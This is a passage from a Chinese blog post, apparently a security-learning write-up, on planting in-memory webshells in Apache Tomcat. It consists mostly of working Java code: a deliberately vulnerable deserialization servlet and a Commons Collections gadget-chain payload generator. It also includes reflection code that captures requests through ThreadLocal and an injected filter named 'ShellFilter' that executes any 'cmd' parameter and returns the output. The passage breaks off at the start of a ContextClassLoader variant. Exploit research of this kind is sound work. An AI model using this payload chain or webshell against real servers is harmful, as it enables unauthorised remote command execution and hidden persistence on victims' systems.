class="headerlink" title="内存马攻击实现"></a>内存马攻击实现</h2><p>因为打内存马一般需要有执行任意字节码的条件，所以我在本地就用cc的依赖来打了。</p><figure class="highlight"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">&lt;dependency&gt;<br>    &lt;groupId&gt;commons-collections&lt;/groupId&gt;<br>    &lt;artifactId&gt;commons-collections&lt;/artifactId&gt;<br>    &lt;version&gt;3.2.1&lt;/version&gt;<br>&lt;/dependency&gt;<br></code></pre></div></td></tr></table></figure><p>关于server</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example.tomcat_webshell;<br><br><span class="hljs-keyword">import</span> javax.servlet.ServletException;<br><span class="hljs-keyword">import</span> javax.servlet.annotation.WebServlet;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServlet;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletRequest;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletResponse;<br><span class="hljs-keyword">import</span> java.io.ByteArrayInputStream;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.InputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CCServlet</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">HttpServlet</span> </span>&#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title">doGet</span><span class="hljs-params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="hljs-keyword">throws</span> ServletException, IOException </span>&#123;<br><span class="hljs-comment">//        InputStream inputStream = (InputStream) req;</span><br><span class="hljs-comment">//        ObjectInputStream objectInputStream = new ObjectInputStream(inputStream);</span><br><span class="hljs-comment">//        try &#123;</span><br><span class="hljs-comment">//            objectInputStream.readObject();</span><br><span class="hljs-comment">//        &#125; catch (ClassNotFoundException e) &#123;</span><br><span class="hljs-comment">//            e.printStackTrace();</span><br><span class="hljs-comment">//        &#125;</span><br>        resp.getWriter().write(<span class="hljs-string">&quot;Success&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title">doPost</span><span class="hljs-params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="hljs-keyword">throws</span> ServletException, IOException </span>&#123;<br>        String cmd = req.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>);<br>        <span class="hljs-keyword">byte</span>[] bytes = Base64.getDecoder().decode(cmd);<br>        ByteArrayInputStream bin =<span class="hljs-keyword">new</span> ByteArrayInputStream(bytes);<br>        ObjectInputStream objectInputStream = <span class="hljs-keyword">new</span> ObjectInputStream(bin);<br>        <span class="hljs-keyword">try</span> &#123;<br>            objectInputStream.readObject();<br>        &#125; <span class="hljs-keyword">catch</span> (ClassNotFoundException e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>        resp.getWriter().write(<span class="hljs-string">&quot;Success&quot;</span>);<br>    &#125;<br>&#125;<br><br></code></pre></div></td></tr></table></figure><p>exp生成payload</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example.tomcat_webshell.shell;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.FactoryTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InstantiateFactory;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><br><span class="hljs-keyword">import</span> java.io.ByteArrayInputStream;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">test3</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception</span>&#123;<br>        TemplatesImpl obj = <span class="hljs-keyword">new</span> TemplatesImpl();<br>        setFieldValue(obj, <span class="hljs-string">&quot;_bytecodes&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-keyword">byte</span>[][]&#123;<br>                ClassPool.getDefault().get(Tomcat_Echo_inject_Filter_cloader.class.getName()).toBytecode()<br>        &#125;);<br>        setFieldValue(obj, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;1&quot;</span>);<br>        setFieldValue(obj, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-keyword">new</span> TransformerFactoryImpl());<br>        InstantiateFactory instantiateFactory;<br>        instantiateFactory = <span class="hljs-keyword">new</span> InstantiateFactory(com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter.class,<span class="hljs-keyword">new</span> Class[]&#123;javax.xml.transform.Templates.class&#125;,<span class="hljs-keyword">new</span> Object[]&#123;obj&#125;);<br><br>        FactoryTransformer factoryTransformer = <span class="hljs-keyword">new</span> FactoryTransformer(instantiateFactory);<br>        ConstantTransformer constantTransformer = <span class="hljs-keyword">new</span> ConstantTransformer(<span class="hljs-number">1</span>);<br>        Map innerMap = <span class="hljs-keyword">new</span> HashMap();<br>        LazyMap outerMap = (LazyMap)LazyMap.decorate(innerMap, constantTransformer);<br>        TiedMapEntry tme = <span class="hljs-keyword">new</span> TiedMapEntry(outerMap, <span class="hljs-string">&quot;keykey&quot;</span>);<br>        Map expMap = <span class="hljs-keyword">new</span> HashMap();<br>        expMap.put(tme, <span class="hljs-string">&quot;valuevalue&quot;</span>);<br>        setFieldValue(outerMap,<span class="hljs-string">&quot;factory&quot;</span>,factoryTransformer);<br>        outerMap.remove(<span class="hljs-string">&quot;keykey&quot;</span>);<br><br>        ByteArrayOutputStream byteArrayOutputStream = <span class="hljs-keyword">new</span> ByteArrayOutputStream();<br>        ObjectOutputStream objectOutputStream = <span class="hljs-keyword">new</span> ObjectOutputStream(byteArrayOutputStream);<br>        objectOutputStream.writeObject(expMap);<br>        objectOutputStream.close();<br>        <span class="hljs-keyword">byte</span>[] payload = byteArrayOutputStream.toByteArray();<br>        System.out.println(<span class="hljs-keyword">new</span> String(Base64.getEncoder().encode(payload)));<br><br><span class="hljs-comment">//        ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(byteArrayOutputStream.toByteArray());</span><br><span class="hljs-comment">//        ObjectInputStream ois = new ObjectInputStream(byteArrayInputStream);</span><br><span class="hljs-comment">//        ois.readObject();</span><br><span class="hljs-comment">//        ois.close();</span><br><br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setFieldValue</span><span class="hljs-params">(Object obj, String fieldName, Object value)</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;<br>        Field field = obj.getClass().getDeclaredField(fieldName);<br>        field.setAccessible(<span class="hljs-keyword">true</span>);<br>        field.set(obj, value);<br>    &#125;<br>&#125;<br><br></code></pre></div></td></tr></table></figure><h3 id="利用ThreadLocal"><a href="#利用ThreadLocal" class="headerlink" title="利用ThreadLocal"></a>利用ThreadLocal</h3><p>如果利用ThreadLocal来种马，则需要执行两次字节码一次为设置request对象，另一次通过request对象获取StandardContext来注册恶意filter。</p><p>第一次执行的字节码源码</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example.tomcat_webshell.shell;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;<br><span class="hljs-keyword">import</span> org.apache.catalina.core.ApplicationFilterChain;<br><span class="hljs-keyword">import</span> org.apache.coyote.AbstractProcessor;<br><br><span class="hljs-comment">//import javax.annotation.processing.AbstractProcessor;</span><br><span class="hljs-keyword">import</span> javax.servlet.ServletResponse;<br><span class="hljs-keyword">import</span> java.io.PrintWriter;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.lang.reflect.Modifier;<br><span class="hljs-keyword">import</span> org.apache.catalina.loader.WebappClassLoaderBase;<br><span class="hljs-keyword">import</span> org.apache.catalina.loader.WebappClassLoader;<br><span class="hljs-keyword">import</span> org.apache.catalina.loader.ParallelWebappClassLoader;<br><span class="hljs-keyword">import</span> org.apache.coyote.http11.Http11Processor;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Tomcat_Echo_inject_ThreadLocal</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">AbstractTranslet</span> </span>&#123;<br>    <span class="hljs-keyword">static</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-comment">//反射获取所需属性</span><br>            java.lang.reflect.Field WRAP_SAME_OBJECT_FIELD = Class.forName(<span class="hljs-string">&quot;org.apache.catalina.core.ApplicationDispatcher&quot;</span>).getDeclaredField(<span class="hljs-string">&quot;WRAP_SAME_OBJECT&quot;</span>);<br><br>            java.lang.reflect.Field lastServicedRequestField = ApplicationFilterChain.class.getDeclaredField(<span class="hljs-string">&quot;lastServicedRequest&quot;</span>);<br>            java.lang.reflect.Field lastServicedResponseField = ApplicationFilterChain.class.getDeclaredField(<span class="hljs-string">&quot;lastServicedResponse&quot;</span>);<br><br>            <span class="hljs-comment">//使用modifiersField反射修改final型变量</span><br>            java.lang.reflect.Field modifiersField = Field.class.getDeclaredField(<span class="hljs-string">&quot;modifiers&quot;</span>);<br>            modifiersField.setAccessible(<span class="hljs-keyword">true</span>);<br>            modifiersField.setInt(WRAP_SAME_OBJECT_FIELD, WRAP_SAME_OBJECT_FIELD.getModifiers() &amp; ~Modifier.FINAL);<br>            modifiersField.setInt(lastServicedRequestField, lastServicedRequestField.getModifiers() &amp; ~Modifier.FINAL);<br>            modifiersField.setInt(lastServicedResponseField, lastServicedResponseField.getModifiers() &amp; ~Modifier.FINAL);<br>            WRAP_SAME_OBJECT_FIELD.setAccessible(<span class="hljs-keyword">true</span>);<br>            lastServicedRequestField.setAccessible(<span class="hljs-keyword">true</span>);<br>            lastServicedResponseField.setAccessible(<span class="hljs-keyword">true</span>);<br><br>            <span class="hljs-comment">//将变量WRAP_SAME_OBJECT_FIELD设置为true，并初始化lastServicedRequest和lastServicedResponse变量</span><br>            <span class="hljs-keyword">if</span> (!WRAP_SAME_OBJECT_FIELD.getBoolean(<span class="hljs-keyword">null</span>)) &#123;<br>                WRAP_SAME_OBJECT_FIELD.setBoolean(<span class="hljs-keyword">null</span>, <span class="hljs-keyword">true</span>);<br>            &#125;<br><br>            <span class="hljs-keyword">if</span> (lastServicedRequestField.get(<span class="hljs-keyword">null</span>) == <span class="hljs-keyword">null</span>) &#123;<br>                lastServicedRequestField.set(<span class="hljs-keyword">null</span>, <span class="hljs-keyword">new</span> ThreadLocal&lt;&gt;());<br>            &#125;<br><br>            <span class="hljs-keyword">if</span> (lastServicedResponseField.get(<span class="hljs-keyword">null</span>) == <span class="hljs-keyword">null</span>) &#123;<br>                lastServicedResponseField.set(<span class="hljs-keyword">null</span>, <span class="hljs-keyword">new</span> ThreadLocal&lt;&gt;());<br>            &#125;<br><br><br>            <span class="hljs-comment">//获取response变量</span><br>            <span class="hljs-keyword">if</span> (lastServicedResponseField.get(<span class="hljs-keyword">null</span>) != <span class="hljs-keyword">null</span>) &#123;<br>                ThreadLocal threadLocal = (ThreadLocal) lastServicedResponseField.get(<span class="hljs-keyword">null</span>);<br>                ServletResponse servletResponse = (ServletResponse) threadLocal.get();<br>                PrintWriter writer = servletResponse.getWriter();<br>                writer.write(<span class="hljs-string">&quot;Inject ThreadLocal Successfully!&quot;</span>);<br>                writer.flush();<br>                writer.close();<br>            &#125;<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br><br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">transform</span><span class="hljs-params">(DOM document, SerializationHandler[] handlers)</span> <span class="hljs-keyword">throws</span> TransletException </span>&#123;<br><br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">transform</span><span class="hljs-params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="hljs-keyword">throws</span> TransletException </span>&#123;<br><br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>需要发送两次第二次才会打印成功</p><p><img src="https://img-blog.csdnimg.cn/28857e682695449a81577712aee76289.png" alt="在这里插入图片描述"></p><p>然后注册恶意filter</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example.tomcat_webshell.shell;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;<br><span class="hljs-keyword">import</span> org.apache.catalina.core.*;<br><span class="hljs-keyword">import</span> org.apache.coyote.AbstractProtocol;<br><span class="hljs-keyword">import</span> org.apache.tomcat.util.descriptor.web.FilterDef;<br><span class="hljs-keyword">import</span> org.apache.tomcat.util.descriptor.web.FilterMap;<br><br><span class="hljs-keyword">import</span> javax.servlet.*;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.InputStream;<br><span class="hljs-keyword">import</span> java.io.PrintWriter;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationTargetException;<br><span class="hljs-keyword">import</span> org.apache.catalina.core.StandardService;<br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Tomcat_Echo_inject_Filter</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">AbstractTranslet</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">Filter</span> </span>&#123;<br>    <span class="hljs-keyword">static</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            ServletContext servletContext = getServletContext();<br>            java.lang.reflect.Field appContextField = servletContext.getClass().getDeclaredField(<span class="hljs-string">&quot;context&quot;</span>);<br>            appContextField.setAccessible(<span class="hljs-keyword">true</span>);<br><br>            ApplicationContext applicationContext = (ApplicationContext) appContextField.get(servletContext);<br>            java.lang.reflect.Field standardContextField = applicationContext.getClass().getDeclaredField(<span class="hljs-string">&quot;context&quot;</span>);<br>            standardContextField.setAccessible(<span class="hljs-keyword">true</span>);<br>            StandardContext standardContext = (StandardContext) standardContextField.get(applicationContext);<br><br><br>            Tomcat_Echo_inject_Filter filter = <span class="hljs-keyword">new</span> Tomcat_Echo_inject_Filter();<br>            String name = <span class="hljs-string">&quot;ShellFilter&quot;</span>;<br>            FilterDef filterDef = <span class="hljs-keyword">new</span> FilterDef();<br>            filterDef.setFilter(filter);<br>            filterDef.setFilterName(name);<br>            filterDef.setFilterClass(filter.getClass().getName());<br>            standardContext.addFilterDef(filterDef);<br><br><br>            FilterMap filterMap = <span class="hljs-keyword">new</span> FilterMap();<br>            filterMap.addURLPattern(<span class="hljs-string">&quot;/*&quot;</span>);<br>            filterMap.setFilterName(name);<br>            filterMap.setDispatcher(DispatcherType.REQUEST.name());<br>            standardContext.addFilterMapBefore(filterMap);<br><br><br>            java.lang.reflect.Field Configs = standardContext.getClass().getDeclaredField(<span class="hljs-string">&quot;filterConfigs&quot;</span>);<br>            Configs.setAccessible(<span class="hljs-keyword">true</span>);<br>            java.util.Map filterConfigs = (java.util.Map) Configs.get(standardContext);<br><br>            java.lang.reflect.Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(org.apache.catalina.Context.class, FilterDef.class);<br>            constructor.setAccessible(<span class="hljs-keyword">true</span>);<br>            ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) constructor.newInstance(standardContext, filterDef);<br>            filterConfigs.put(name, filterConfig);<br><br>        &#125; <span class="hljs-keyword">catch</span> (NoSuchFieldException e) &#123;<br>            e.printStackTrace();<br>        &#125; <span class="hljs-keyword">catch</span> (ClassNotFoundException e) &#123;<br>            e.printStackTrace();<br>        &#125; <span class="hljs-keyword">catch</span> (IllegalAccessException e) &#123;<br>            e.printStackTrace();<br>        &#125; <span class="hljs-keyword">catch</span> (InvocationTargetException e) &#123;<br>            e.printStackTrace();<br>        &#125; <span class="hljs-keyword">catch</span> (NoSuchMethodException e) &#123;<br>            e.printStackTrace();<br>        &#125; <span class="hljs-keyword">catch</span> (InstantiationException e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br><br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> ServletContext <span class="hljs-title">getServletContext</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> ClassNotFoundException, NoSuchFieldException, IllegalAccessException </span>&#123;<br>        java.lang.reflect.Field lastServicedRequestField = ApplicationFilterChain.class.getDeclaredField(<span class="hljs-string">&quot;lastServicedRequest&quot;</span>);<br>        lastServicedRequestField.setAccessible(<span class="hljs-keyword">true</span>);<br>        ThreadLocal threadLocal = (ThreadLocal) lastServicedRequestField.get(<span class="hljs-keyword">null</span>);<br>        <span class="hljs-keyword">if</span>(threadLocal!=<span class="hljs-keyword">null</span> &amp;&amp; threadLocal.get()!=<span class="hljs-keyword">null</span>)&#123;<br>            ServletRequest servletRequest = (ServletRequest) threadLocal.get();<br>            <span class="hljs-keyword">return</span> servletRequest.getServletContext();<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">null</span>;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">transform</span><span class="hljs-params">(DOM document, SerializationHandler[] handlers)</span> <span class="hljs-keyword">throws</span> TransletException </span>&#123;<br><br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">transform</span><span class="hljs-params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="hljs-keyword">throws</span> TransletException </span>&#123;<br><br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">init</span><span class="hljs-params">(FilterConfig filterConfig)</span> <span class="hljs-keyword">throws</span> ServletException </span>&#123;<br><br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">doFilter</span><span class="hljs-params">(ServletRequest request, ServletResponse response, FilterChain chain)</span> <span class="hljs-keyword">throws</span> IOException, ServletException </span>&#123;<br>        String cmd = request.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>);<br>        response.setContentType(<span class="hljs-string">&quot;text/html; charset=UTF-8&quot;</span>);<br>        PrintWriter writer = response.getWriter();<br>        <span class="hljs-keyword">if</span> (cmd != <span class="hljs-keyword">null</span>) &#123;<br>            <span class="hljs-keyword">try</span> &#123;<br>                InputStream in = Runtime.getRuntime().exec(cmd).getInputStream();<br><br>                <span class="hljs-comment">//将命令执行结果写入扫描器并读取所有输入</span><br>                java.util.Scanner scanner = <span class="hljs-keyword">new</span> java.util.Scanner(in).useDelimiter(<span class="hljs-string">&quot;\\A&quot;</span>);<br>                String result = scanner.hasNext()?scanner.next():<span class="hljs-string">&quot;&quot;</span>;<br>                scanner.close();<br>                writer.write(result);<br>                writer.flush();<br>                writer.close();<br>            &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>                e.printStackTrace();<br>            &#125; <span class="hljs-keyword">catch</span> (NullPointerException n) &#123;<br>                n.printStackTrace();<br>            &#125;<br>        &#125;<br>        chain.doFilter(request, response);<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">destroy</span><span class="hljs-params">()</span> </span>&#123;<br><br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/b05d02baa69b40308387ce234cba58e2.png" alt="在这里插入图片描述"></p><h3 id="利用ContextClassLoader"><a href="#利用ContextClassLoader" class="headerlink" title="利用ContextClassLoader"></a>利用ContextClassLoader</h3><p>其实这里有两种方法，一种是用request来种马，一种是获取到StandardContext后拼接上注册恶意filter的那部分实现内存马。相对来讲第二种更简单,这里采用了第二种方法。</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span 